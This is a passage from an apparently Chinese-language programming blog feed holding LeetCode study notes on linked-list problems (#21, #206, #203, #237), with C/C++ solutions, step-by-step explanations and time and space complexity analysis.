Linked List 在比較兩個lists的時候就放到新創建的list中</p><ul><li>先建立一個Linked List，將要返回的內容串接在後面</li><li>比較兩個Linked List 的value大小，將較小的加入dummy list</li><li>加入後，原先list的元素會少一個，因此會需要將指標更新 (<code>ptr2 = ptr2-&gt;next;</code>, <code>ptr1 = ptr1-&gt;next;</code>)</li><li>結束後，若還有剩餘的元素在，就在直接加進 dummy 串列中</li><li>最後回傳 dummyy串列中第一個有值的位址</li></ul><blockquote><p>參考： <a href="https://hackmd.io/@ChangTL/S1z11PWJv#021-Merge-Two-Sorted-Lists">https://hackmd.io/@ChangTL/S1z11PWJv#021-Merge-Two-Sorted-Lists</a></p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/21/results.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 😉😉😉😉Please upvote if it helps 😉😉😉😉</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ListNode* <span class="title function_">mergeTwoLists</span><span class="params">(ListNode* list1, ListNode* list2)</span> &#123;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// if list1 happen to be NULL</span></span><br><span class="line"><span class="comment">// we will simply return list2.</span></span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> list2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if list2 happen to be NULL</span></span><br><span class="line"><span class="comment">// we will simply return list1.</span></span><br><span class="line">        <span class="keyword">if</span>(list2 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> list1;</span><br><span class="line">        </span><br><span class="line">        ListNode * ptr = list1;</span><br><span class="line">        <span class="keyword">if</span>(list1 -&gt; val &gt; list2 -&gt; val)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = list2;</span><br><span class="line">            list2 = list2 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            list1 = list1 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *curr = ptr;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// till one of the list doesn&#x27;t reaches NULL</span></span><br><span class="line">        <span class="keyword">while</span>(list1 &amp;&amp;  list2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(list1 -&gt; val &lt; list2 -&gt; val)&#123;</span><br><span class="line">                curr-&gt;next = list1;</span><br><span class="line">                list1 = list1 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                curr-&gt;next = list2;</span><br><span class="line">                list2 = list2 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            curr = curr -&gt; next;</span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adding remaining elements of bigger list.</span></span><br><span class="line">        <span class="keyword">if</span>(!list1)</span><br><span class="line">            curr -&gt; next = list2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curr -&gt; next = list1;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>Time Complexity:</strong> $O(n+m)$</li><li><strong>Space Complexity:</strong> $O(1)$</li></ul><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/21/results2.png"></p><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><p>在這個合併兩個已排序linked list的函數中，我們主要考慮走訪每個節點所需的時間，<strong>在最壞情況下，兩個linked list中的每個節點都需要被traverse一次</strong></p><ul><li>假設 <code>list1</code> 有<code>n</code> 個節點，而 <code>list2</code> 有 <code>m</code> 個節點</li><li>因此，整個過程中，走訪的節點總數是 <code>n + m</code></li><li>節點的比較和鏈結操作都是常數時間操作</li><li>所以，時間複雜度是 $O(n + m)$</li></ul><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><h2 id="空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：-使用了一個-dummy-節點，它的空間是常數級別的-O-1-其餘使用的指標-如-ptr1-ptr2-tail-也都是常數級別的空間-所以空間複雜度會是-O-1"><a href="#空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：-使用了一個-dummy-節點，它的空間是常數級別的-O-1-其餘使用的指標-如-ptr1-ptr2-tail-也都是常數級別的空間-所以空間複雜度會是-O-1" class="headerlink" title="空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：- 使用了一個 dummy 節點，它的空間是常數級別的 $O(1)$- 其餘使用的指標 (如 ptr1, ptr2, tail) 也都是常數級別的空間- 所以空間複雜度會是 $O(1)$"></a>空間複雜度分析考慮的是程式執行所需的額外記憶體空間，在這個函數中：<br>- 使用了一個 dummy 節點，它的空間是常數級別的 $O(1)$<br>- 其餘使用的指標 (如 <code>ptr1</code>, <code>ptr2</code>, <code>tail</code>) 也都是常數級別的空間<br>- 所以空間複雜度會是 $O(1)$</h2>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反向鏈結串列 | Easy |LeetCode#206 Reverse Linked List</title>
      <link href="/posts/a6b83df3.html"/>
      <url>/posts/a6b83df3.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/206/question-1.png"></p><p><img src="/img/LeetCode/206/question-2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 給定一個 linked list 的 <code>head</code>，希望整個 list 反轉，並且回傳反轉後的list</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 定義節點結構</span><br><span class="line">2. 建立 linked list</span><br><span class="line">3. reverseList()</span><br><span class="line">4. 建立暫存節點，用來存放下一個節點的位址，也需要站存上一個節點的位址</span><br><span class="line">4-1. 將下一個節點的位址鏈結到上一個節點</span><br><span class="line">4-2. 更新暫時存節點</span><br><span class="line">4-3 . 更新前一個節點</span><br><span class="line">4-4.  移動至下一個節點</span><br><span class="line">5. 更新初始節點指標</span><br><span class="line">6. 回傳初始節點指標</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/206/algo.png"></p><blockquote><p>後來我發現 <code>head</code> 跟tail 其實可以不用各別分開處理</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverseList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">tempNode</span>, *<span class="title">current</span>, *<span class="title">previous</span>;</span>    </span><br><span class="line">    current = head;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        tempNode = current-&gt; next;</span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        previous = current;</span><br><span class="line">        current = tempNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> previous;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li><p>一開始宣告了三個指標變數:</p><ul><li><code>tempNode</code>: 用於臨時保存當前節點的下一個節點</li><li><code>current</code>: 用於走訪 linked list 的當前節點</li><li><code>previous</code>: 用於保存當前節點的前一個節點，最終會成為反轉後的新的頭節點</li></ul></li><li><p>初始化:</p><ul><li>將 <code>current</code> 初始化為 <code>head</code>，即list的頭節點</li><li>將 <code>previous</code> 初始化為 NULL，因為反轉後的新頭節點的下一個節點應為 NULL</li></ul></li><li><p>迴圈部分:</p><ul><li>只要還有節點需要處理，就繼續反轉，直到遇到 NULL</li><li>一開始先保存當前節點的下一個節點，這樣在改變指標方向後不會丟失剩下的 list</li><li><strong>將當前節點的 <code>next</code> 指標指向前一個節點 (<code>previous</code>)，這是實現反轉的關鍵一步</strong></li><li><code>previous = current</code>: 移動 previous 指標，使其指向當前節點，為下一次迴圈做準備</li><li><code>current = tempNode</code>: 移動 current 指標，使其指向原來的下一個節點，繼續處理下一個節點</li></ul></li><li><p>當迴圈結束時，<code>previous</code> 指向的是反轉後的 list 的頭節點，因為當 <code>current</code> 為 NULL 時， <code>previous</code> 剛好是最後一個非空節點</p></li><li><p>回傳 <code>previous</code></p></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/206/results.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverseList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span>&#123;</span><br><span class="line">    <span class="comment">// Special case...</span></span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>)  <span class="keyword">return</span> head;</span><br><span class="line">    <span class="comment">// Initialize prev pointer as the head...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">prev</span> =</span> head;</span><br><span class="line">    <span class="comment">// Initialize curr pointer as the next pointer of prev...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">curr</span> =</span> prev-&gt;next;</span><br><span class="line">    <span class="comment">// Initialize next of head pointer as NULL...</span></span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Run a loop till curr and prev points to NULL...</span></span><br><span class="line">    <span class="keyword">while</span>(prev != <span class="literal">NULL</span> &amp;&amp; curr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// Initialize next pointer as the next pointer of curr...</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span> =</span> curr-&gt;next;</span><br><span class="line">        <span class="comment">// Now assign the prev pointer to curr’s next pointer.</span></span><br><span class="line">        curr-&gt;next = prev;</span><br><span class="line">        <span class="comment">// Assign curr to prev, next to curr...</span></span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;    <span class="comment">// Return the prev pointer to get the reverse linked list...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這是解答區其他人回覆的做法，也是 0ms，他的做法跟我的大同小異，但他的會需要額外去判斷是否為 empty list 並且把 <code>head</code> 指向 NULL 單獨出來做。</p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/206/results-2.png"></p><blockquote><p>看來這樣要多判斷的狀況，會添加將近 3ms…</p></blockquote><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><ul><li>時間複雜度: $O(n)$: while迴圈這部分是traverse鏈結串列的主要邏輯，遍歷整個鏈結串列的時間複雜度是 $O(n)$， <code>n</code> 會是節點數量</li><li>空間複雜度 $O(1)$: 三個指標（<code>tempNode</code>, <code>current</code>, <code>previous</code>）：這些變量佔用常數空間  $O(1)$。</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鏈結串列刪除元素 | Easy |LeetCode#203 Remove Linked List Elements</title>
      <link href="/posts/2db2c541.html"/>
      <url>/posts/2db2c541.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/203/question1.png"></p><p><img src="/img/LeetCode/203/question2.png"></p><ul><li>題目難度: Easy</li><li>題目描述: 給定一個 Linked List 的 <code>head</code> 以及想要刪除節點的數值 <code>val</code>，要我們移除list中<strong>所有等於 <code>val</code> 的節點</strong>，所以如果所有節點數值都等於 <code>val</code> 則結果會是一個 emptt list</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 定義節點結構</span><br><span class="line">2. 建立 linked list</span><br><span class="line">3. removeElements</span><br><span class="line">3-1. 宣告暫存空間</span><br><span class="line">3-2  判斷是否是 Empty List</span><br><span class="line">3-3. 走訪整個List</span><br><span class="line">3-4. 判斷是否等於 val，如果等於:那就將前一個節點連接到後一個節點，並釋放記憶體以刪除 val 所在節點</span><br><span class="line">3-5  回傳head</span><br></pre></td></tr></table></figure><p>這是看到題目後一開始的主要想法，並且一開始很天真的想說還需要考慮刪除節點在 Head, 中間 以及 Tail 三種狀況，實作後才發現其實只需要判斷頭跟其他地方就好，Tail 應該不用單獨拿出來處理。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeElements</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">previous</span> =</span> head;</span><br><span class="line">    <span class="comment">// empty list</span></span><br><span class="line">    <span class="keyword">if</span> (ptr== <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;empty list\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> ptr;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( ptr-&gt;val == val)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">tmp</span> =</span> ptr;</span><br><span class="line">            <span class="keyword">if</span>( ptr == head )&#123;</span><br><span class="line">                head = ptr-&gt;next;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;   </span><br><span class="line">                previous-&gt;next = ptr-&gt;next;</span><br><span class="line">                ptr = ptr-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(tmp);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            previous = ptr;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>程式碼在一開始宣告了兩個指標，分別用來遍歷鏈結串列 (<code>ptr</code>) 和跟踪當前節點的前一個節點 (<code>previous</code>)</li><li>首先判斷 Empty List 的狀況，若發現 emptry list 回傳 head，原封不動的還回去</li><li>接著，若節點不是空的，則開始遍歷整個List，如果發現節點的資料等於 <code>val</code> (<code>if ( ptr-&gt;val == val)</code>)，則可以後續判斷是否是在頭節點還是其他地方，如果資料不匹配，那就直接換下一個節點 ，所以要更新 <code>previous</code> 指標以及 <code>ptr</code>指標 (<code>previous = ptr;</code>, <code>ptr = ptr-&gt;next;</code>)</li><li>當然，還需要宣告一個暫存用的指標，來存放要被刪除的節點位址</li><li>接著判斷 <code>ptr == head </code> 是否為頭節點，如果是那就更新 <code>head</code> 指標，以及 <code>ptr</code> 指標，來繼續走訪，並且透過 free 來釋放記憶體位址</li><li>如果不是頭節點，也就是中間或tail節點，這時需要將前一個節點指向 <code>val</code> 的後一個節點 (<code>previous-&gt;next = ptr-&gt;next;</code>)，後續一樣再用 <code>ptr = ptr-&gt;next;</code> 來繼續走訪 list </li><li>回傳 <code>head</code></li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/203/result1.png"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><p>上面的做法使用了兩個指標來儲存狀態，其實也有辦法減少到使用一個指標</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">removeElements</span><span class="params">(<span class="keyword">struct</span> ListNode* head, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">// Apporach-2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr</span> =</span> head;</span><br><span class="line">    <span class="comment">// empty list</span></span><br><span class="line">    <span class="keyword">if</span> (ptr== <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;empty list\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> ptr;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Handle head node</span></span><br><span class="line">    <span class="keyword">while</span>(head!=<span class="literal">NULL</span> &amp;&amp; head-&gt;val==val)&#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>( ptr != <span class="literal">NULL</span> &amp;&amp; ptr-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( ptr-&gt;next-&gt;val == val)&#123;</span><br><span class="line">            ptr-&gt;next = ptr-&gt;next-&gt;next;     </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/203/result2.png"></p><p>對比先前的結果，又更進一步減少空間的使用</p><h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><ul><li>時間複雜度: $O(n)$:  while迴圈這部分是traverse鏈結串列的主要邏輯。遍歷整個鏈結串列的時間複雜度是 $O(n)$，其中 <code>n</code> 是鏈結串列中的節點數量。在最壞情況下，每個節點都會被檢查一次，並且可能會被刪除</li><li>空間複雜度 $O(1)$: 這段程式碼不需要額外的數據結構來存儲鏈結串列或其部分，除了 <code>*ptr</code>, <code>*previous</code> 兩個指標變數，這些都是用於遍歷和操作鏈結串列的指針，佔用的是常數空間，即 $O(1)$，刪除節點時使用的臨時指標也屬於常數空間，因此整體空間複雜度依然是 $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刪除鏈結串列 | Medium | LeetCode#237 Delete Node in a Linked List</title>
      <link href="/posts/5efda43a.html"/>
      <url>/posts/5efda43a.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/237/question-1.png"></p><p><img src="/img/LeetCode/237/question-2.png"></p><p><img src="/img/LeetCode/237/question-3.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述: 如同圖中所述，題目中要求我們對一個 Single Linked List <code>head</code> 去實現一個刪除特定節點的函式，函式的輸入叫做 <code>node</code>，題目中有特別說明。</li><li>限制:<ul><li><code>node</code> 不會是 <code>head</code>中的最後一個節點，並且我們並不能夠存取 <code>head</code> 中的第一個元素，也就是整個 List 的初始節點。</li><li>這題的刪除節點不需要釋放記憶體，僅需將前一個節點連接到 <code>node</code> 的後一個節點</li></ul></li></ul><blockquote><p>在 Run 以及 Submit 的時候，題目會建好List 並且呼叫我們寫的function，來去進行測試，這題只需要專注在刪除節點的邏輯上就好</p></blockquote><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始我陷入了傳統刪除節點的做法當中，也就是已知初始節點的條件下去走訪每個節點，指到找到給定節點，再去執行刪除的邏輯。</p><h3 id="傳統作法"><a href="#傳統作法" class="headerlink" title="傳統作法"></a>傳統作法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Node* <span class="title function_">DeleteNode</span><span class="params">(Node* first ,Node* node)</span>&#123;</span><br><span class="line">    Node* ptr= first;</span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Noting to print\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Delete first node of the list</span></span><br><span class="line">    <span class="keyword">if</span> (node == first)&#123;</span><br><span class="line">        <span class="comment">// Update the first pointer to the next node</span></span><br><span class="line">        first = first-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// ptr traverse through the list</span></span><br><span class="line">        <span class="keyword">while</span> (ptr-&gt;next != node)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr-&gt;next = node-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(node);</span><br><span class="line">        <span class="keyword">return</span> first;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這種做法會<strong>需要知道 <code>node</code>的前一個節點，才有辦法指向到 <code>node</code>的下一個節點</strong>，但這題中，已知資訊只有 <code>node</code> 的位址，<strong>因此沒辦法知道前一個節點是誰。</strong></p><p><img src="/img/LeetCode/237/explain.png"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>面對這種狀況，可以換一個想法，<strong>可以把 <code>node</code> 後面節點的資料往前複製過來，持續進行，直到遇到NULL，也能夠實現一樣的效果</strong></p><p><img src="/img/LeetCode/237/solution.png"></p><figure class="highlight c"><table><tr><td 